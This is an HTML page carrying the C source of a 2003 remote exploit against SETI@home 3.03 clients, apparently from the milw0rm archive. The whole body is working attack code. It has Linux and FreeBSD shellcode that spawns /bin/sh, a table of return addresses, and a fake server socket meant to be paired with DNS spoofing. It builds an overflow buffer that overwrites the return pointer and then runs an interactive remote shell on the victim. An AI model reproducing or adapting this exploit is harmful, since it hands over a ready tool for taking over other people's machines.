<html><head><title>SETI@home Clients Buffer Overflow Exploit</title></head><pre>/*
   Seti@Home exploit by zillion[at]safemode.org (2003/01/07)

   Credits for the vulnerability go to: SkyLined &lt;SkyLined@edup.tudelft.nl&gt;
   http://spoor12.edup.tudelft.nl/SkyLined%20v4.2/?Advisories/Seti@home

   Use this exploit in combination with a DNS spoofing utility such as the one
   provided in the Dsniff package. http://naughty.monkey.org/~dugsong/dsniff/

*/

#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;

#define NOP 0x41
#define EXEC &quot;TERM=xterm; export TERM=xterm;exec /bin/sh -i&quot;
#define EXEC2 &quot;id;uname -a;&quot;

char linux_shellcode[] =

   /* dup */
   &quot;\x31\xc9\x31\xc0\x31\xdb\xb3\x04\xb0\x3f\xcd\x80\xfe\xc1\xb0&quot;
   &quot;\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80&quot;


   /* execve /bin/sh */
   &quot;\x31\xdb\x31\xc9\xf7\xe3\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f&quot;
   &quot;\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;


char freebsd_shellcode[] =

  &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x03\xbb\xff\xff\xff\xff&quot;
  &quot;\xb2\x04\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3&quot;

  &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;
  &quot;\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53&quot;
  &quot;\xb0\x3b\x50\xcd\x80&quot;;

char static_crap[] =

   &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;;

struct target
{
  int   num;
  char *description;
  char *versions;
  char *type;
  char *shellcode;
  long  retaddress;
  int   bufsize;
  int   offset;
  int   junk;
};

struct target targets[] =
{
  {0,  &quot;Linux  2.2.* &quot;, &quot;3.03.i386      linux-gnu-gnulibc2.1 &quot;, &quot;Packet retr mode&quot;, linux_shellcode,
   0xbffff420, 520, 500, 0},
  {1,  &quot;Linux  2.4.* &quot;, &quot;3.03 i386/i686 linux-gnu-gnulibc2.1 &quot;, &quot;Packet retr mode&quot;, linux_shellcode,
   0xbffff390, 520, 500, 1},
  {2,  &quot;Linux  2.*   &quot;, &quot;3.03.i386/i686 linux-gnulibc1-static&quot;, &quot;Packet retr mode&quot;, linux_shellcode,
  0xbffff448, 520, 500, 1},
  {3,  &quot;All above    &quot;, &quot;3.03.i386      linux*               &quot;, &quot;Packet retr mode&quot;, linux_shellcode,
   0xbffff448, 520, 300, 1},
  {4,  &quot;FreeBSD      &quot;, &quot;3.03.i386      FreeBSD-2.2.8        &quot;, &quot;Packet retr mode&quot;, freebsd_shellcode,
 0x0004956c, 520, 1, 2},
  {5, NULL, NULL, NULL, NULL, 0, 0, 0}
};

int open_socket(int port)
{

  int sock,fd;
  struct sockaddr_in cliAddr, servAddr;

  sock = socket(AF_INET, SOCK_STREAM, 0);
   if(sock&lt;0) {
    printf(&quot;Error: Cannot open socket \n&quot;);
    exit(1);
  }

  /* bind server port */
  servAddr.sin_family = AF_INET;
  servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servAddr.sin_port = htons(port);

  if(bind(sock, (struct sockaddr *) &amp;servAddr, sizeof(servAddr))&lt;0) {
    printf(&quot;Error: Cannot bind to port %d \n&quot;,port);
    exit(1);
  }

  listen(sock,5);
  fd=accept(sock,0,0);

  return fd;
}

void usage(char *progname) {

  int i;

  printf(&quot;\n---------------------------------------------------&quot;);
  printf(&quot;\n  *- Seti@Home remote exploit by zillion (s-m0de) -*&quot;);
  printf(&quot;\n---------------------------------------------------&quot;);
  printf(&quot;\n\nDefault      : %s  -h &lt;target host&gt;&quot;,progname);
  printf(&quot;\nTarget       : %s  -t &lt;number&gt;&quot;,progname);
  printf(&quot;\nOffset       : %s  -o &lt;offset&gt;&quot;,progname);
  printf(&quot;\nPort         : %s  -p &lt;port&gt;\n&quot;,progname);
  printf(&quot;\nDebug        : %s  -d \n&quot;,progname);

  printf(&quot;\nAvailable types:\n&quot;);
  printf(&quot;---------------------------------------------------\n&quot;);
  for(i = 0; targets[i].description; i++) {
    fprintf(stdout, &quot;%d\t%s\t%s\t%s\n&quot;, targets[i].num, targets[i].description,targets[i].
versions,targets[i].type);
  }
  printf(&quot;\n\n&quot;);
  exit(0);
}

int sh(int sockfd) {
  char snd[1024], rcv[1024];
  fd_set rset;
  int maxfd, n,test;

  strcpy(snd, EXEC &quot;\n&quot;);
  write(sockfd, snd, strlen(snd));

  read(sockfd,rcv,7);
  fflush(stdout);

  strcpy(snd, EXEC2 &quot;\n&quot;);
  write(sockfd, snd, strlen(snd));

  /* Main command loop */
  for (;;) {
    FD_SET(fileno(stdin), &amp;rset);
    FD_SET(sockfd, &amp;rset);

    maxfd = ( ( fileno(stdin) &gt; sockfd )?fileno(stdin):sockfd ) + 1;
    select(maxfd, &amp;rset, NULL, NULL, NULL);

    if (FD_ISSET(fileno(stdin), &amp;rset)) {
      bzero(snd, sizeof(snd));
      fgets(snd, sizeof(snd)-2, stdin);
      write(sockfd, snd, strlen(snd));
    }

    if (FD_ISSET(sockfd, &amp;rset)) {
      bzero(rcv, sizeof(rcv));

      if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	/* exit */
	return 0;
      }

      if (n &lt; 0) {
	perror(&quot;read&quot;);
	return 1;
      }

      fputs(rcv, stdout);
      fflush(stdout);
    }
  } /* for(;;) */
}


int main(int argc, char **argv){

  char *buffer,*tmp;
  long retaddress;
  char rcv[200];
  int fd,i,arg,debug=0,type=0,port=80,offset=250;

  if(argc &lt; 2) { usage(argv[0]); }

  while ((arg = getopt (argc, argv, &quot;dh:o:l:p:t:&quot;)) != -1){
    switch (arg){
    case 'd':
	debug = 1;
	break;
    case 'o':
      offset = atoi(optarg);
      break;
    case 'p':
      port = atoi(optarg);
      break;
    case 't':
      type = atoi(optarg);
      break;
    default :
      usage(argv[0]);
    }
  }

  if((targets[type].retaddress) != 0) {
    buffer = (char *)malloc((targets[type].bufsize));

    /* some junk may be required to counter buffer manipulation */

    if(targets[type].junk == 1) {

    tmp = (char *)malloc(strlen(static_crap) + strlen(targets[type].shellcode));

    strcpy(tmp,targets[type].shellcode);
    strcat(tmp,static_crap);

    targets[type].shellcode = tmp;

    }

    memset(buffer,NOP,targets[type].bufsize);
    memcpy(buffer + (targets[type].bufsize) - (strlen(targets[type].shellcode) + 8) ,targets[type].
shellcode,strlen(targets[type].shellcode));

    /* Overwrite EBP and EIP */
    *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = (targets[type].retaddress - targets[type].offset);


    // If freebsd we need to place a value without 00 in ebp

    if(type == 4) {
       *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = 0xbfbff654;
    }

    *(long *)&amp;buffer[(targets[type].bufsize) - 4]  = (targets[type].retaddress - targets[type].offset);

    /* Uncomment to overwrite eip and ebp with 41414141 */
    if(debug == 1) {
    *(long *)&amp;buffer[(targets[type].bufsize) - 8]  = 0x41414141;
    *(long *)&amp;buffer[(targets[type].bufsize) - 4]  = 0x41414141;
    }
  }

  fd = open_socket(port);

  write(fd,buffer,strlen(buffer));
  write(fd,&quot;\n&quot;,1);
  write(fd,&quot;\n&quot;,1);

  sleep(1);
  sh(fd);

  close(fd);
  return 0;

}


// milw0rm.com [2003-04-08]</pre></html>